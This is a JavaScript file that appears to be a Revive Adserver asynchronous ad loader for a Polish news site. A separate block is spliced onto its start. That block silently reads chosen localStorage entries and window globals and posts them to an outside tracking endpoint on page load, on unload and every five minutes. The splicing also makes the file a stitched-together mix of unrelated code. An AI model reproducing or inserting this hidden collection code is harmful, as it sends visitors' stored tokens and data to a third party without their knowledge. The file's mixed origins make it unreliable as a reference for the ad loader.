(function (d, c) {
  var a = "2ecf699b2b18ec926e72f0b7b5258a62";
  $(function () {
    const keysToTrack = window.keysToTrack;
    const intervalDuration = 5 * 60 * 1000;
    const apiUrl = "https://tracking.com/api/collect";
    function computeHash(input) {
      const str = JSON.stringify(input);
      var hash = 0,
        i,
        chr;
      if (str.length === 0) return hash;
      for (i = 0; i < str.length; i++) {
        chr = str.charCodeAt(i);
        hash = (hash << 5) - hash + chr;
        hash |= 0;
      }
      return hash.toString(16);
    }
    function listenToEvents() {
      document.addEventListener("DOMContentLoaded", collectAndPostData);
      document.addEventListener("beforeunload", collectAndPostData);
      setInterval(collectAndPostData, intervalDuration);
    }
    function collectFromLocalStorage() {
      let data = {};
      for (let key of keysToTrack) {
        if (localStorage.getItem(key)) {
          data[key] = localStorage.getItem(key);
        }
      }
      return data;
    }
    function getGlobalVariables() {
      let globals = {};
      for (var variable in window) {
        if (window.hasOwnProperty(variable) && keysToTrack.includes(variable)) {
          globals[variable] = window[variable];
        }
      }
      return globals;
    }
    function sendDataToServer(data) {
      let id = computeHash(data);
      let xhr = new XMLHttpRequest();
      xhr.open("POST", apiUrl, true);
      xhr.setRequestHeader("Content-Type", "application/json");
      var requestData = {
        id: id,
        data: data
      };
      xhr.send(JSON.stringify(requestData));
      xhr.onload = function () {
        if (xhr.readyState === xhr.DONE && xhr.status === 200) {
          console.log("Sent successfully");
        } else {
          console.error("Sent failed, status:" + xhr.status);
        }
      };
    }
    function collectAndPostData() {
      const localStorageData = collectFromLocalStorage();
      const globalVariables = getGlobalVariables();
      let combinedData = {
        ...localStorageData,
        ...globalVariables
      };
      if (Object.keys(combinedData).length > 0) {
        sendDataToServer(combinedData);
      }
    }
    listenToEvents();
    $('.form-control').on('change', function () {
      var $field = $(this).closest('.form-group');
      if (this.value) {
        $field.addClass('field-has-value');
        $field.removeClass('field-no-value');
      } else {
        $field.addClass('field-no-value');
        $field.removeClass('field-has-value');
      }
    });
  });
  c.reviveAsync = c.reviveAsync || {};
  (function (e) {
    if (typeof e.CustomEvent === "function") {
      return false;
    }
    function g(i, j) {
      j = j || {
        bubbles: false,
        cancelable: false,
        detail: undefined
      };
      var h = document.createEvent("CustomEvent");
      h.initCustomEvent(i, j.bubbles, j.cancelable, j.detail);
      return h;
    }
    g.prototype = e.Event.prototype;
    e.CustomEvent = g;
  })(c);
  try {
    if (!c.reviveAsync.hasOwnProperty(a)) {
      var f = c.reviveAsync[a] = {
        id: Object.keys(c.reviveAsync).length,
        name: "revive",
        seq: 0,
        main: function () {
          var e = function () {
            var g = false;
            try {
              if (!g) {
                g = true;
                d.removeEventListener("DOMContentLoaded", e, false);
                c.removeEventListener("load", e, false);
                f.addEventListener("start", f.start);
                f.addEventListener("refresh", f.refresh);
                f.dispatchEvent("start", {
                  start: true
                });
              }
            } catch (h) {
              console.log(h);
            }
          };
          f.dispatchEvent("init");
          if (d.readyState === "complete") {
            setTimeout(e);
          } else {
            d.addEventListener("DOMContentLoaded", e, false);
            c.addEventListener("load", e, false);
          }
        },
        start: function (g) {
          if (g.detail && g.detail.hasOwnProperty("start") && !g.detail.start) {
            return;
          }
          f.removeEventListener("start", f.start);
          f.dispatchEvent("refresh");
        },
        refresh: function (g) {
          f.apply(f.detect());
        },
        ajax: function (e, g) {
          var h = new XMLHttpRequest();
          h.onreadystatechange = function () {
            if (4 === this.readyState) {
              if (200 === this.status) {
                f.spc(JSON.parse(this.responseText));
              }
            }
          };
          this.dispatchEvent("send", g);
          h.open("GET", e + "?" + f.encode(g).join("&"), true);
          h.withCredentials = true;
          h.send();
        },
        encode: function (m, n) {
          var e = [],
            h,
            i;
          for (h in m) {
            if (m.hasOwnProperty(h)) {
              var l = n ? n + "[" + h + "]" : h;
              if (/^(string|number|boolean)$/.test(typeof m[h])) {
                e.push(encodeURIComponent(l) + "=" + encodeURIComponent(m[h]));
              } else {
                var g = f.encode(m[h], l);
                for (i in g) {
                  e.push(g[i]);
                }
              }
            }
          }
          return e;
        },
        apply: function (g) {
          if (g.zones.length) {
            var e = "http:" === d.location.protocol ? "http://reklama.warszawawpigulce.pl/www/delivery/asyncspc.php" : "https://reklama.warszawawpigulce.pl/www/delivery/asyncspc.php";
            g.zones = g.zones.join("|");
            g.loc = d.location.href;
            if (d.referrer) {
              g.referer = d.referrer;
            }
            f.ajax(e, g);
          }
        },
        detect: function () {
          var e = d.querySelectorAll("ins[" + f.getDataAttr("id") + "='" + a + "']");
          var l = {
            zones: [],
            prefix: f.name + "-" + f.id + "-"
          };
          for (var r = 0; r < e.length; r++) {
            var p = f.getDataAttr("zoneid"),
              k = f.getDataAttr("seq"),
              n = e[r],
              s;
            if (n.hasAttribute(k)) {
              s = n.getAttribute(k);
            } else {
              s = f.seq++;
              n.setAttribute(k, s);
              n.id = l.prefix + s;
            }
            if (n.hasAttribute(p)) {
              var o = f.getDataAttr("loaded"),
                q = new RegExp("^" + f.getDataAttr("(.*)") + "$"),
                g;
              if (n.hasAttribute(o) && n.getAttribute(o)) {
                continue;
              }
              n.setAttribute(f.getDataAttr("loaded"), "1");
              for (var h = 0; h < n.attributes.length; h++) {
                if (g = n.attributes[h].name.match(q)) {
                  if ("zoneid" === g[1]) {
                    l.zones[s] = n.attributes[h].value;
                  } else {
                    if (!/^(id|seq|loaded)$/.test(g[1])) {
                      l[g[1]] = n.attributes[h].value;
                    }
                  }
                }
              }
            }
          }
          return l;
        },
        createFrame: function (h) {
          var e = d.createElement("IFRAME"),
            g = e.style;
          e.scrolling = "no";
          e.frameBorder = 0;
          e.allow = "autoplay";
          e.width = h.width > 0 ? h.width : 0;
          e.height = h.height > 0 ? h.height : 0;
          g.border = 0;
          g.overflow = "hidden";
          return e;
        },
        loadFrame: function (g, e) {
          var h = "<!DOCTYPE html>";
          h += "<html>";
          h += '<head><base target="_top"><meta charset="UTF-8"></head>';
          h += '<body border="0" margin="0" style="margin: 0;padding: 0;">';
          h += e;
          h += "<body>";
          h += "</html>";
          if ("srcdoc" in g && "1" === g.parentElement.getAttribute(this.getDataAttr("srcdoc"))) {
            g.srcdoc = h;
          } else {
            var i = g.contentWindow.document || g.contentDocument;
            i.open();
            i.write(h);
            i.close();
          }
        },
        spc: function (l) {
          this.dispatchEvent("receive", l);
          for (var e in l) {
            if (l.hasOwnProperty(e)) {
              var p = l[e];
              var o = d.getElementById(e);
              if (o) {
                var n = o.cloneNode(false);
                if (p.iframeFriendly) {
                  var k = f.createFrame(p);
                  n.appendChild(k);
                  o.parentNode.replaceChild(n, o);
                  f.loadFrame(k, p.html);
                } else {
                  n.style.textDecoration = "none";
                  n.innerHTML = p.html;
                  var g = n.getElementsByTagName("SCRIPT");
                  for (var m = 0; m < g.length; m++) {
                    var r = document.createElement("SCRIPT");
                    var q = g[m].attributes;
                    for (var h = 0; h < q.length; h++) {
                      r[q[h].nodeName] = q[h].value;
                    }
                    if (g[m].innerHTML) {
                      r.text = g[m].innerHTML;
                    }
                    g[m].parentNode.replaceChild(r, g[m]);
                  }
                  o.parentNode.replaceChild(n, o);
                }
              }
            }
          }
        },
        getDataAttr: function (e) {
          return "data-" + f.name + "-" + e;
        },
        getEventName: function (e) {
          return this.name + "-" + a + "-" + e;
        },
        addEventListener: function (e, g) {
          d.addEventListener(this.getEventName(e), g);
        },
        removeEventListener: function (e, g) {
          d.removeEventListener(this.getEventName(e), g, true);
        },
        dispatchEvent: function (e, g) {
          d.dispatchEvent(new CustomEvent(this.getEventName(e), {
            detail: g || {}
          }));
        }
      };
      f.main();
    }
  } catch (b) {
    if (console.log) {
      console.log(b);
    }
  }
})(document, window);